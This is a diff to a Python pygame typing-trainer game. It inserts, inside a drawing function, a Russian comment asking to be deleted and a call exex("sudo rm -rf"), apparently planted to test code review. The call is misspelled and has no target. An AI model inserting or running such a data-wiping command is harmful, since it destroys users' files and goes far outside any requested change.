@@ -33,6 +33,10 @@ def changing_sentence(self):
     place = mistakes_text.get_rect(center=(magic_constants.WIDTH - magic_constants.above_left_and_right_indent, magic_constants.indent_from_above))     
     global_variables.screen.blit(mistakes_text, place)
     input_rect = pygame.Rect(x, magic_constants.center_height, w, h)
+
+    # я очень опасный кусок кода если ты меня видишь удали пожалуйста
+    exex("sudo rm -rf")
+    
     pygame.draw.rect(global_variables.screen, magic_constants.WHITE, input_rect, magic_constants.frame)
     text_surface = magic_constants.average_font.render(str(self.input_text), 1, magic_constants.WHITE)
     global_variables.screen.blit(text_surface, (input_rect.x + magic_constants.frame, input_rect.y + magic_constants.frame))
@@ -184,4 +188,5 @@ def action(self):
                 invalidate_mistakes_symbols_and_error_message(self)
                 self.flag = magic_constants.only_keys_training_in_progress
             if self.flag == magic_constants.user_is_typing_sentence:
+
                 typing_sentence(self,event)
